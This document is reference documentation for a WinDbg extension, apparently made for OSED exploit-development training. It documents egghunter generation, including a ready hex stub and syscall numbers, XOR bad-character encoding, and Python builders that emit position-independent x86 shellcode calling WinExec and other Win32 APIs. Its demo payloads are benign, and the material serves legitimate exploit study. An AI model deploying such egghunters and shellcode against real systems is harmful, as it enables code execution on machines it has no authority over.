# Shellcode commands

Use these commands to build the egghunter, write custom shellcode, encode a payload around bad characters, and pad the landing zone.

Run each command as `dx @$osed().<command>` in WinDbg. The [command index](../COMMANDS.md#conventions) explains byte lists, addresses, and optional arguments. `dx @$osed().help("<command>", "full")` prints the built-in help. Append `.explain` to any call, as in `dx @$osed().modules().explain`, for a plain-language explanation and a report sentence.

| Command | What it does |
| --- | --- |
| [`egghunter`](#egghunter) | Print an egghunter stub for a 4-byte tag, as hex and as Python bytes, and flag stub bytes that are bad characters. |
| [`encode`](#encode) | XOR-encode a payload so that it contains none of the excluded bytes, and print the decoder stub with it. |
| [`nop`](#nop) | Print a NOP sled of `length` bytes. |
| [`sc.push_string`](#scpush_string) | Print x86 pushes that build a NUL-terminated string on the stack with no `00` or bad byte. |
| [`sc.call_frame`](#sccall_frame) | Print the pushes and calls for one stdcall API call through the `sc.template` resolver, with the ROR13 hash. |
| [`sc.template`](#sctemplate) | Print a complete `build_sc.py` that assembles custom shellcode with Keystone and reports every bad byte. |
| [`sc.builder`](#scbuilder) | Print `sc_builder.py`: write one API call per line in its `CONFIG`, run it, and get shellcode checked for bad bytes, size, and forward calls. It picks the resolver's registers, each argument's instruction form, and the cdecl cleanup against `BADCHARS`. |

### egghunter

Print an egghunter stub for a 4-byte tag, as hex and as Python bytes, and flag stub bytes that are bad characters.

```text
egghunter(tag?, mode?, wow64?, badchars?, os?, syscall?)
```

```text
dx @$osed().egghunter("W00T", "ntaccess", true, "00 0A 0D", "win10")
dx @$osed().egghunter("W00T", "ntaccess", false, "00 0A 0D", "win10-1909")
dx @$osed().egghunter("W00T", "ntaccess", false, "", "19041")
dx @$osed().egghunter("W00T", "ntaccess", false, "", "", 0x1C8)
dx @$osed().egghunter("W00T", "ntdisplay", false, "00 0A 0D", "win7")
dx @$osed().egghunter("B33F", "seh")
```

Modes are `ntaccess` (default, `NtAccessCheckAndAuditAlarm`), `ntdisplay` (32 bytes, `NtDisplayString`, Windows 7 and older), and `seh` (67 bytes, no syscall). Put the tag twice in front of the payload, for example `b"W00TW00T"`.

Set `wow64` to `true` for a 32-bit process on 64-bit Windows 10 or 11. The native stub (32 to 36 bytes) calls `int 0x2e`, and WOW64 stops that with `STATUS_ILLEGAL_INSTRUCTION` (`0xC000001D`). The WOW64 stub (49 bytes on Windows 10 and 11) calls the 64-bit service through the gate at `fs:[0xC0]`, the same way the 32-bit `ntdll` does. `ntdisplay` has no WOW64 stub.

The syscall number depends on the Windows build, and a wrong number breaks the hunter. Pass `os` to take the number from the table below, or `syscall` to set it yourself. `syscall` wins over `os`. Without either, or with an `os` that the table does not list, the stub uses the Windows 10 22H2 number and prints a warning that names it. To read the number on the target, run `u ntdll!NtAccessCheckAndAuditAlarm L1` and take the `mov eax` value. In a WOW64 process that command shows the 64-bit number, which is the one the WOW64 stub needs.

| `os` | Build (`winver`) | Native 32-bit | WOW64 |
| --- | --- | --- | --- |
| `xp`, `2003`, `vista`, `win7` | 2600 to 7601 | `0x02` | not supported |
| `win8` | 9200 | `0x1AA` | not supported |
| `win8.1` | 9600 | `0x1AF` | not supported |
| `win10-1507` | 10240 | `0x1B7` | `0x29` |
| `win10-1511` | 10586 | `0x1BA` | `0x29` |
| `win10-1607` | 14393 | `0x1BC` | `0x29` |
| `win10-1703` | 15063 | `0x1C2` | `0x29` |
| `win10-1709` to `win10-1909` | 16299 to 18363 | `0x1C6` | `0x29` |
| `win10-2004`, `win10-20h2`, `win10-21h1` | 19041 to 19043 | `0x1C8` | `0x29` |
| `win10-21h2`, `win10-22h2`, `win10` | 19044, 19045 | `0x1C9` | `0x29` |
| `win11` | 22000 to 26200 | none | `0x29` |

`os` also takes the build number, such as `"19041"`. The numbers come from [j00ru's syscall tables](https://j00ru.vexillium.org/syscalls/nt/32/). On Windows 7 and 8 the WOW64 gate takes its arguments in other registers, so the WOW64 stub covers only Windows 10 and 11. `ntdisplay` takes its number from the same table: `0x43` for XP, `0x46` for Server 2003, and `0x6D` for Windows 7. Without `os` it uses the XP number and prints a warning. The Vista number (`0x80`) and every number from Windows 8 on do not fit the stub's `push imm8`, so for those builds the command stops with an error that tells you to use `ntaccess`.

Every stub is free of null bytes. `ntaccess` loads the syscall number with the shortest form that avoids `00` and the bad characters you pass: `push imm8 ; pop eax` up to `0x7F`, `xor eax, eax ; mov al` or `mov ah` for one non-zero byte, `xor eax, eax ; mov ax, imm16` for numbers such as `0x1C9`, and `mov eax, ~n ; not eax` when the number's own bytes are bad characters. That is why the stub size changes with the number. `seh` reaches its handler through a backward `call` instead of `call $+5`. The bad-character check covers the whole stub and the tag, so a warning means a byte in the loop itself, such as `0F` or `FF`; then run the hunter through [`encode`](#encode).

The Windows 10 WOW64 stub for tag `W00T`, 49 bytes, which found an egg in a WOW64 process on Windows 11:

```text
33DB53535353535353535353B3C06681CAFF0F4252526A295864FF135A5A3C0574ECB8573030548BFAAF75E7AF75E4FFE7
```

The `seh` stub needs DEP off for the process, because Windows rejects an exception handler outside a loaded image when DEP is on.

### encode

XOR-encode a payload so that it contains none of the excluded bytes, and print the decoder stub with it.

```text
encode(shellcode, exclude?, key?)
```

```text
dx @$osed().encode("FC E8 82 00 00 00 60", "00 0A 0D")
dx @$osed().encode("FC E8", "00 0A 0D", 0x41)
```

It picks a key that clears every excluded byte, or uses `key` when you pass one. The output has the key, the decoder stub, the encoded bytes, and the combined payload as Python bytes. Default excludes are `00 0A 0D`.

### nop

Print a NOP sled of `length` bytes.

```text
nop(length, byte?)
```

```text
dx @$osed().nop(16)
dx @$osed().nop(32)
dx @$osed().nop(16, 0x90)
```

`byte` defaults to `0x90`.

## Write custom shellcode

`sc.push_string`, `sc.call_frame`, `sc.template`, and `sc.builder` print assembly text and read nothing from the target, so they work in any process. They write 32-bit code only. Write one shellcode by hand first, with the PEB walk, the export walk, and the hash loop, before you rely on the generator. You then know what to change when a fixed line holds a bad character.

### sc.push_string

Print x86 pushes that build a NUL-terminated string on the stack with no `00` or bad byte.

```text
sc.push_string(text, badchars?, register?)
```

```text
dx @$osed().sc.push_string("calc.exe")
dx @$osed().sc.push_string("cmd /c dir", "00 0A 0D 20", "ebx")
```

The text is split into little-endian dwords, and the last dword is pushed first, so ESP ends at the first character. When the length is a multiple of 4, the terminator is a separate zero dword built with `xor reg, reg ; push reg`. A partial last dword holds `00` bytes, so it is built through a scratch register. The command tries `push imm`, then `mov reg, ~v ; not reg`, `mov reg, -v ; neg reg`, `mov reg, v ^ key ; xor reg, key`, and `mov reg, v - k ; add reg, k`. It keeps the first form whose bytes, opcodes included, avoid `00` and every bad character. The scratch register is `eax`, then `ecx`, then `edx`. Pass `register` to copy ESP into it after the pushes, before later pushes move ESP away from the string.

Each line shows its bytes and the 4 characters it pushes. The same lines then print as a Keystone `CODE` string:

```text
xor eax, eax     ; 31 C0
push eax         ; 50              "\0\0\0\0"
push 0x6578652e  ; 68 2E 65 78 65  ".exe"
push 0x636c6163  ; 68 63 61 6C 63  "calc"

CODE = (
    "xor eax, eax;"
    "push eax;"         # "\0\0\0\0"
    "push 0x6578652e;"  # ".exe"
    "push 0x636c6163;"  # "calc"
)
```

With spaces as bad characters, every dword that holds a space goes through a register:

```text
mov eax, 0xffff8d96  ; B8 96 8D FF FF
not eax              ; F7 D0
push eax             ; 50              "ir\0\0"
mov eax, 0x9bdf9cd0  ; B8 D0 9C DF 9B
not eax              ; F7 D0
push eax             ; 50              "/c d"
mov eax, 0xdf9b929c  ; B8 9C 92 9B DF
not eax              ; F7 D0
push eax             ; 50              "cmd "
mov ebx, esp         ; 89 E3           ebx -> "cmd /c dir"
```

`00` is always treated as bad. The command fails when the text is empty, when `register` is `esp`, or when no listed form avoids the bad characters.

### sc.call_frame

Print the pushes and calls for one stdcall API call through the `sc.template` resolver, with the ROR13 hash.

```text
sc.call_frame(api, args..., "bad=<list>"?)
```

```text
dx @$osed().sc.call_frame("WinExec", "<ptr to cmd>", "1")
dx @$osed().sc.call_frame("TerminateProcess", "-1", "0", "bad=00 0A 0D")
```

The arguments are pushed in reverse order, with one comment each. A number is pushed with the same null-free forms as `sc.push_string`, through a scratch register that no argument names. A register, an `[ebp±n]` slot, or any other expression is pushed as written. Text in angle brackets is marked as a placeholder to replace before you assemble. Then come the ROR13 hash of the export name, the module base, `call dword ptr [ebp-0x04]` to resolve the address, and `call eax`:

```text
push 0x1                   ; 6A 01           arg2 uCmdShow = 1
push <ptr to cmd>          ; ??              arg1 lpCmdLine = <ptr to cmd> (placeholder)
push 0xe8afe98             ; 68 98 FE 8A 0E  ROR13("WinExec") = 0x0e8afe98
push dword ptr [ebp-0x08]  ; FF 75 F8        kernel32 base
call dword ptr [ebp-0x04]  ; FF 55 FC        resolver: eax = WinExec
call eax                   ; FF D0           WinExec pops its 2 argument(s)
```

The frame assumes the `sc.template` slots below EBP: the resolver at `[ebp-0x04]`, the kernel32 base at `[ebp-0x08]`, and the last `LoadLibraryA` base at `[ebp-0x0c]`. A known API outside kernel32, such as `WSAStartup` or `MessageBoxA`, takes its base from `[ebp-0x0c]`. The prototype table names the arguments of `WinExec`, `ExitProcess`, `TerminateProcess`, `ExitThread`, `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `CreateProcessA`, `WaitForSingleObject`, `WSAStartup`, `WSASocketA`, `connect`, and `MessageBoxA`, and warns when the argument count differs. A known name typed in another case is hashed with its export spelling. An unknown name prints a warning and is hashed exactly as typed, because export names are case-sensitive. A fixed line that holds a bad character, such as `FF` in `push dword ptr [ebp-0x08]`, prints a warning that names the line.

### sc.template

Print a complete `build_sc.py` that assembles custom shellcode with Keystone and reports every bad byte.

```text
sc.template(task..., "bad=<list>"?)
```

```text
dx @$osed().sc.template("winexec=calc.exe", "exit")
dx @$osed().sc.template("show=0", "winexec=cmd.exe /c whoami > C:\\out.txt", "terminate", "bad=00 0A 0D 20")
dx @$osed().sc.template("loadlibrary=user32.dll", "getprocaddress=MessageBoxA")
```

Tasks run in the order you give them:

| Task | Code it adds |
| --- | --- |
| `winexec=<command line>` | Push the command with `sc.push_string`, then call `WinExec(ebx, show)`. |
| `loadlibrary=<dll>` | Call `LoadLibraryA(name)` and store the base at `[ebp-0x0c]`. |
| `getprocaddress=<export>` | Call `GetProcAddress([ebp-0x0c], name)` and store the address at `[ebp-0x10]`. Before any `loadlibrary` task, `[ebp-0x0c]` holds the kernel32 base. |
| `exit` | Call `ExitProcess(0)`. |
| `terminate` | Call `TerminateProcess(-1, 0)`, where `-1` is the current process. |
| `show=<n>` | Set `uCmdShow` for later `winexec` tasks. The default is 1. |
| `bad=<list>` | Set the bad characters for the generated pushes and for the script check. |

With no task you get `winexec=calc.exe` and `exit`. Without an exit task, the code returns to its caller, which suits a test loader that calls the shellcode.

The assembly has five parts:

1. `pushad ; mov ebp, esp ; add esp, 0xfffff810` saves the registers and reserves 0x7f0 bytes. An `add` of a negative number has no `00` byte, unlike `sub esp, 0x7f0`.
2. The kernel32 lookup reads the PEB through `fs:[ecx+0x30]`, then `Ldr` and `InInitializationOrderModuleList`. It takes the first module whose `BaseDllName` is 24 bytes long (12 UTF-16 characters) and starts with `K` in either case.
3. A short forward `jmp` reaches a backward `call`, which pushes the address of `resolve_hash` with a negative rel32 and no `00` byte. That address goes to `[ebp-0x04]`.
4. Each task adds its call frames. `resolve_hash(module_base, hash)` walks the export name table, hashes each name, and maps a match through the ordinal table to the function address in EAX, or 0 when no name matches. It pops both arguments and keeps every register except EAX. The hash loop uses `rol edx, 0x13`, which equals `ror edx, 13` and keeps the common bad character `0D` out of the code.
5. `mov esp, ebp ; popad ; ret` returns to the caller.

The Python part assembles the whole `ASM` list with `Ks(KS_ARCH_X86, KS_MODE_32)`. It also assembles each line alone at its final offset and checks that the lines add up to the whole. It then prints the size and each bad byte with its offset and its line, writes `shellcode.bin`, and prints the bytes as a `shellcode += b"\x.."` literal. The script exits with code 1 when a bad byte is present. The first lines for `sc.template("winexec=calc.exe", "exit")`:

```python
#!/usr/bin/env python3
# build_sc.py from osed-windbg sc.template("winexec=calc.exe", "exit")
# Needs Python 3 and keystone-engine (pip install keystone-engine).
import re
import sys

from keystone import Ks, KS_ARCH_X86, KS_MODE_32

BADCHARS = bytes([0x00])

ASM = [
    # Entry: save the caller's registers, open a frame, and move esp 0x7f0 bytes down.
    "pushad",
    "mov ebp, esp",
    "add esp, 0xfffff810",                # esp = ebp - 0x7f0; a sub of 0x7f0 would hold 00 bytes
```

The output of `python build_sc.py`:

```text
[+] 213 bytes
[+] 0 bad bytes against 00
[+] wrote shellcode.bin
shellcode = b""
shellcode += b"\x60\x89\xe5\x81\xc4\x10\xf8\xff\xff\x31\xc9\x64\x8b\x41\x30\x8b"
```

The default output holds no `00` byte, and the fixed routines also avoid `0A`, `0D`, and `20`. A bad character that you add can still hit a fixed line, for example `FF` in `call dword ptr [ebp-0x04]`. The script names that line, and you rewrite it by hand. The kernel32 match assumes that kernel32.dll is the first 12-character name that starts with `K` in initialization order. That held on Windows 10 build 19045 and Windows 11 build 26200, where a WinExec template ran in a 32-bit process.

To run the result, build `tests/manual/sc_writer/loader.c`, a 32-bit loader that copies `shellcode.bin` into RWX memory and calls it. The loader exits with `0x600D` when the shellcode returns. `tests/manual/sc_writer/check.py` assembles every line the three commands print with Keystone and compares the bytes.

### sc.builder

Print `sc_builder.py`, a config-driven builder. You write one API call per line at its top, run it, and get shellcode checked for bad bytes, size, and forward calls.

```text
sc.builder(task..., "bad=<list>"?, "xor"?, "max=<bytes>"?)
```

```text
dx @$osed().sc.builder()
dx @$osed().sc.builder("show=0", "winexec=cmd.exe /c whoami > C:\\out.txt", "terminate", "bad=00 0A 0D 20 2F")
dx @$osed().sc.builder("winexec=calc.exe", "exit", "bad=00 0A 0D", "xor", "max=400")
```

With no argument the command prints the script exactly as `tools/sc_builder.py` in this repository. `npm run build` regenerates the embedded copy, and a test fails when the two differ. Arguments take the `sc.template` tasks and fill the `CONFIG` block from them, so `winexec=`, `loadlibrary=`, `getprocaddress=`, `exit`, `terminate`, `show=`, and `bad=` work as above. `xor` sets `XOR_ENCODER = True` and `max=<bytes>` sets `MAX_SIZE`. The filled block holds the six settings, a blank line, and one statement per task. A `loadlibrary=` task binds the module handle to `hmod`. A second such task binds `hmod2`, and a third binds `hmod3`. A `getprocaddress=` task reads the most recent of those names, or `base("kernel32.dll")` when no `loadlibrary=` task came before it. For any other API sequence, save the script and edit `CONFIG`. It needs Python 3 and `keystone-engine`. `capstone` is optional.

`sc.builder("loadlibrary=user32.dll", "getprocaddress=MessageBoxA", "bad=00 0A 0D")` fills `CONFIG` with:

```python
BADCHARS = b"\x00\x0a\x0d"
MAX_SIZE = None
EXIT = "ret"
XOR_ENCODER = False
CDECL = ()
DEBUG = False

# The builder loads DLLs and resolves exports itself: dll("user32.dll").MessageBoxA(NULL, s("text"), s("caption"), MB_OK) needs neither call.
hmod = k32.LoadLibraryA(s("user32.dll"))
k32.GetProcAddress(hmod, s("MessageBoxA"))
```

`CONFIG` is the only part you edit:

| Name | Meaning |
| --- | --- |
| `BADCHARS` | Bytes the output may not contain, such as `b"\x00\x0a\x0d"`. `00` is always added. |
| `MAX_SIZE` | `None`, or the most bytes the shellcode may take. |
| `EXIT` | `"terminate"` for `TerminateProcess(-1, 0)`, `"exit"` for `ExitProcess(0)`, `"ret"` to restore the registers and return. |
| `XOR_ENCODER` | `True` prepends a XOR decoder stub, as plan B when a bad byte remains. |
| `CDECL` | Export names the caller must clean up after, beyond the ones the builder knows. |
| `DEBUG` | `True` puts an `int3` after every name lookup, taken only when the lookup came back 0. |
| `k32.<Api>(args)` | One call to kernel32.dll. Write one call per line, in execution order. Export names are case-sensitive. |
| `dll("name").<Api>(args)` | One call to another DLL, which the builder loads once with `LoadLibraryA`. |

A call returns its result, the value the API leaves in EAX. Bind it to a name and pass that name to a later call:

```python
handle = k32.CreateFileA(...)
k32.WriteFile(handle, ...)
```

The name holds the call's position, captured when the call ran, so another call inserted above it cannot move it.

`buf(size)` binds the same way. Bind it to a name, and every call that takes the name gets one address, so one API can fill the buffer and the next can read it:

```python
path = buf(260)
k32.GetTempPathA(260, path)
k32.lstrcatA(path, s("out.txt"))
```

A `buf(size)` written inline is its own space, for an out-parameter that nothing else reads. The listing names each one, as in `arg1 = buf(260) #1, scratch at ebp-0x184`, and the number after the hash is the buffer's identity. Two lines that report the same offset are the same buffer.

Each argument is listed in prototype order and pushed in reverse:

| Argument | Pushed value |
| --- | --- |
| an int | The dword, built by the shortest clean form: `push imm8`/`imm32`, `xor reg, reg` with `inc`/`dec` or `mov al`/`ax`, `push imm8 ; pop`, `mov` with `not`, `neg`, or a XOR key, or an `add`/`sub` split. |
| a Win32 constant | The dword the name holds, such as `SW_HIDE` or `CREATE_ALWAYS`. |
| `s("text")` | The address of the NUL-terminated string, pushed on the stack before the arguments. |
| `w("text")` | The same for a UTF-16LE string, for W APIs. |
| the name of an earlier call | That call's return value, such as a handle. |
| `buf(size)` | The address of `size` bytes of scratch space below EBP, for out-parameters. The space is not zeroed. Every call that takes one `buf()` result gets one address. |
| `base("dll")` | The base address of kernel32.dll or of a DLL the builder loads. |
| `ref(n)` | The return value of call `n`, counted from 1. The older literal form below uses it. |

The builder defines these Win32 constants under their MSDN names: `NULL`, `GENERIC_READ`, `GENERIC_WRITE`, `FILE_SHARE_READ`, `FILE_SHARE_WRITE`, `CREATE_NEW`, `CREATE_ALWAYS`, `OPEN_EXISTING`, `OPEN_ALWAYS`, `TRUNCATE_EXISTING`, `FILE_ATTRIBUTE_NORMAL`, `SW_HIDE`, `SW_SHOWNORMAL`, `SW_SHOW`, `MB_OK`, `MEM_COMMIT`, `MEM_RESERVE`, `PAGE_READWRITE`, `PAGE_EXECUTE_READWRITE`. Any other constant goes in as its number.

Four configs:

```python
# Run a command, then end the process.
k32.WinExec(s("cmd.exe /c whoami > C:\\Users\\Public\\w.txt"), SW_HIDE)
EXIT = "terminate"

# A message box. The builder loads user32.dll with LoadLibraryA first.
dll("user32.dll").MessageBoxA(NULL, s("Hello from sc_builder"), s("OSED"), MB_OK)
EXIT = "exit"

# Write a file. buf(4) receives the count WriteFile writes back.
handle = k32.CreateFileA(s("C:\\Users\\Public\\out.txt"), GENERIC_WRITE, 0, NULL,
                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
k32.WriteFile(handle, s("hello"), 5, buf(4), NULL)
k32.CloseHandle(handle)
EXIT = "ret"

# Format text into a buffer, then write that buffer. wsprintfA is cdecl and
# returns the length, which WriteFile takes as the count.
text = buf(64)
pid = k32.GetCurrentProcessId()
written = dll("user32.dll").wsprintfA(text, s("pid=%u"), pid)
handle = k32.CreateFileA(s("C:\\Users\\Public\\pid.txt"), GENERIC_WRITE, 0, NULL,
                         CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
k32.WriteFile(handle, text, written, buf(4), NULL)
k32.CloseHandle(handle)
EXIT = "exit"
```

#### Calling conventions

Win32 is stdcall, where the API drops its own arguments, so the generated call needs no cleanup. A cdecl export leaves that to the caller. The builder carries a table of the exports that are cdecl and drops their arguments itself: `wsprintfA`, `wsprintfW`, `sprintf`, `swprintf`, `_snprintf`, `_snwprintf`, `_vsnprintf`, `_vsnwprintf`, `printf`, `sscanf`, `swscanf`, `memcpy`, `memmove`, `memset`, `strcpy`, `strcat`, `strlen`, `strcmp`, `wcscpy`, `wcscat`, `wcslen`, `malloc`, `free`, `atoi`, `_itoa`, `system`, and `exit`. The varargs formatters cannot know their own argument count, and the C runtime in msvcrt.dll and in ntdll.dll is cdecl throughout.

For any other cdecl export, name it in `CDECL` or call it through `.cdecl`:

```python
CDECL = ("MyPrintf",)
dll("mine.dll").MyPrintf(buf(64), s("%u"), 1)
dll("mine.dll").OtherPrintf.cdecl(buf(64), s("%u"), 1)
```

Both routes add the name to one registry, which the emitter reads once per call. The literal `CALLS` form has no call site to mark, so it uses `CDECL`. A cdecl call is followed by the shortest clean way off those pushes: `add esp, N`, `sub esp, -N`, `lea esp, [esp+N]`, or `pop ecx` once per argument. Forbidding `0x10` turns `add esp, 0x10` into `sub esp, -0x10` rather than planting a bad byte. `CDECL` holding one string instead of a sequence of names fails the build.

The older literal form still works. `CALLS = [(dll, api, [args])]`, with `ref(n)` for the result of call `n`, assembles the same bytes as the same calls written one per line, and `tests/manual/sc_builder/check.py` checks that for the command and for the file write. The one-call-per-line form exists because `ref(n)` is a position, not a call. Insert a call above the `CreateFileA` and every later `ref(n)` names the call before the one you meant, while the build still reports 0 bad bytes and 0 problems. A name is bound when its call runs, so a call inserted above it cannot move it. A `CONFIG` block that holds both forms fails to build and prints `CONFIG mixes both call forms. Keep either the literal CALLS list or the recorded k32 and dll() calls`.

#### The registers the fixed code runs on

The PEB walk and the resolver are fixed code, but which register fills each role in them is not. The module base, the export-name counter, the running hash, and the pointer into module data take EBX, ECX, EDX, and EDI in whichever order assembles clean, and the builder keeps the shortest such order. EAX and ESI never move: EAX is the resolver's return value and the destination `lodsb` writes, ESI the address it reads.

The choice matters because a register decides a ModRM byte. `mov ebx, dword ptr [esp+0x18]`, the line that reads the resolver's first argument, is `8b 5c 24 18`, and `5c` is a bad character in the OSED Lab14 and Lab15 transport, which forbids `00 0A 0D 2E 3A 5C`. Against that set only 2 of the 24 orders are clean, so no single swap would do. `mov ecx, dword ptr [esp+0x18]` is `8b 4c 24 18`, which is why the builder reports `base ecx` there. Against a set the course order already survives, it reports `base ebx, counter ecx` and assembles the same bytes as before.

The counter keeps `jecxz` when it sits in ECX, which is two bytes shorter than the `test` and `jz` the other registers need, so the shortest-first rule prefers ECX for it. When no order is clean and `XOR_ENCODER` is `False`, the build fails with `no register assignment keeps the PEB walk and the resolver clear of <bytes>`. With the encoder on, the order with the fewest bad bytes wins and the stub covers them.

#### Trap a failed lookup

A wrong hash or a misspelled export leaves the resolver returning 0. The slot holds 0, and the shellcode calls address 0 several instructions later, far from the mistake. `DEBUG = True` puts a `test` and an `int3` after every lookup, the `LoadLibraryA` bases included, so you stop at the lookup that failed instead. The jump clears its own `int3`, so it is two bytes however far apart the lookups sit and cannot plant a bad byte of its own.

It costs five bytes per lookup. A Lab15 config with seven calls goes from 485 to 525 bytes with eight lookups, so leave `DEBUG` at `False` for the payload you deliver. With `0xcc` in `BADCHARS` the build fails with `DEBUG needs the int3 byte 0xcc, which BADCHARS forbids`.

Each `int3` names its lookup in the listing, as in `int3  ; DEBUG: user32.dll!wsprintfA came back 0`. Under a debugger, the address you stop at names the lookup. Without a debugger, the exception address does the same. A Lab15 config with `wsprintfA` misspelled as `wsprintfQ` reported `excecao 0x80000003 em 0BCC0838` from a load address of `0BCC0738`, so offset `0x100`, which the listing gives as the `wsprintfQ` trap. The same config with `DEBUG = False` reported `excecao 0xc0000005 em 00000000`, which says a call went to 0 but not which one.

#### What the generated code does

The generated code has the same prologue, PEB walk, and backward-call resolver as `sc.template`. Then it resolves each API once: `LoadLibraryA` first when a DLL needs loading, each DLL base into its own slot, then every API address into a slot next to EBP, so a call is `call dword ptr [ebp-0x..]`. Before each call it pushes the call's strings, last dword first, and saves each address in a slot. A dword that holds a bad character is loaded as `mov eax, value ^ key ; xor eax, key`, with a key byte chosen so that both bytes are clean, and falls back to `not`, `neg`, or an `add`/`sub` split. The arguments follow in reverse, then the call. The call's result goes to a slot when a later call reads it, through a bound name or through `ref()`. Slot offsets that are bad characters are skipped.

The script prints the ROR13 table, which you can check against `dx @$osed().sc.hash("<api>", "ROR13")`. It assembles each line alone at its final offset with Keystone and compares the result with one whole assembly. It lists the code, disassembled by Capstone when it is installed (and checked to decode line by line) or as the assembler input otherwise. It reports every bad byte with its offset and line, every `call` with a forward or `00`-holding rel32, and the size against `MAX_SIZE`. It writes `shellcode.bin` and prints a `shellcode += b"\x.."` literal. Exit code 1 means a check failed.

With `XOR_ENCODER = True` the script prepends a stub of about 20 bytes, 22 for the 277-byte command above, for 299 bytes in all. A forward `jmp` to a backward `call` gives the encoded body's address, the stub XORs each byte in place with one key, and `ret` jumps into the decoded code. The key is the first one that keeps both the stub and the encoded body clean. The stub writes over the code, so the page must be writable, and the script prints that warning.

The encoder changes what counts as a problem. The body never reaches the transport as written, so its bad bytes are printed as information under `[i] the body holds N bad byte(s) as written, which is what the encoder is for` and the build still exits 0. What must be clean is what the transport carries, which is the stub plus the encoded body. A forward `call` stays a problem either way, because the decoded body executes it. When no key works, the body's bad bytes become problems again, since then nothing decodes them.

The run of `python sc_builder.py` for the first config, with `BADCHARS = b"\x00\x0a\x0d\x20\x2f"`, starts and ends like this:

```text
[+] 1 call(s), exit terminate, bad chars 00 0a 0d 20 2f
[+] PEB walk and resolver registers: base ebx, counter ecx, hash edx, exports edi, eax result, esi name cursor
[+] ROR13 hashes; check one in WinDbg with dx @$osed().sc.hash("<api>", "ROR13")
    api                      dll              hash
    WinExec                  kernel32.dll     0x0e8afe98
    TerminateProcess         kernel32.dll     0x78b5b983
[+] code, 277 bytes:
    ...
    00d6  b8 68 21 3f 21           mov eax, 0x213f2168
    00db  35 01 01 01 01           xor eax, 0x1010101
    00e0  50                       push eax                                  ; "i > " (xor key 0x1010101)
    ...
[+] 277 bytes
[+] 0 bad bytes against 00 0a 0d 20 2f
[+] 0 problems
[+] wrote shellcode.bin
```

`tests/manual/sc_builder/check.py` builds 12 configs, each of which must exit 0 with no bad byte:

| Config | What it pins |
| --- | --- |
| `a`, `a_literal` | The command above, written one call per line and as a literal `CALLS` list. |
| `b` | The message box, which loads user32.dll. |
| `c`, `c_literal` | The file write, in both forms. |
| `c_inserted` | The file write with a `CreateDirectoryA` call inserted above the `CreateFileA`. |
| `lab_badchars` | The Lab14 command against `00 0A 0D 2E 3A 5C`, which must not leave the module base on EBX. |
| `buffers` | A named `buf(260)` passed to three calls, plus an inline `buf(4)`, which must report two frame offsets and no more. |
| `cdecl` | `wsprintfA` from the table, one name from `CDECL`, and one marked with `.cdecl`, against two stdcall calls that get no cleanup. |
| `xor_needed`, `d` | `XOR_ENCODER = True`, over a body that needs it and over one that does not. |
| `debug` | `DEBUG = True`, which must plant one named `int3` per lookup. |

Each literal config must assemble to the same bytes as the one-call-per-line config it mirrors, and `c_inserted` must report the handle as `ref(2)`, with no `ref(1)` and no stored result for the inserted call. Four more configs must fail: one that holds both call forms, one whose bad characters leave no usable XOR key, one that asks for `DEBUG` with `0xcc` forbidden, and one whose `CDECL` is a single string. With `--bundle dist/osed-legacy.js` it also checks that `sc.builder` with the matching tasks builds the same bytes as the command.

`tests/manual/sc_builder/catches.py` answers the other half, which is whether a case can fail. It takes the builder from a git revision, `b38da38` by default, runs the five configs that hold a defect shut, and exits 1 if any of them passes there. Against `b38da38` the `buffers` config reports four frame offsets where two are right, and the other four configs exit 1. Run it after adding a regression case.

The command, the file write, and the XOR-encoded command ran in the `tests/manual/sc_writer/loader.c` loader in a 32-bit process on Windows 10 build 19045 and wrote their files. The Lab14 command, the Lab15 formatter, a buffer composed by `GetTempPathA` and `lstrcatA`, and an encoded body ran against the Lab14 and Lab15 benches on the OSED-DEV clone. `lab/v2/prove_sc_builder.py` in the OSED lab tree rebuilds and reruns all of them.
